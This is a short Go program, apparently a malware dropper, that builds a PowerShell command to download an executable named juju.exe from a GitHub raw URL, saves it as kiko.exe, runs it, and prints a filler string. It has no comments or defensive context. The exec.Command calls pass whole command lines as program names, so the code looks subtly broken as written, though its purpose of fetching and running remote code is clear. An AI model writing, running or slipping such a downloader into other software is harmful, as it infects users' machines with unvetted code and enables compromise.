package main

import (
	"fmt"
	"os/exec"
)


func main(){

	var comando string = "powershell -command iwr https://github.com/xosuu/messi/raw/refs/heads/main/windows/juju.exe -outfile kiko.exe"
	
	var ejecutarProg string = `.\kiko.exe `
	
	cmd := exec.Command(comando)
	cmd.Run()

	com := exec.Command(ejecutarProg)
	com.Run()
	fmt.Println("Asdasdasd")

}







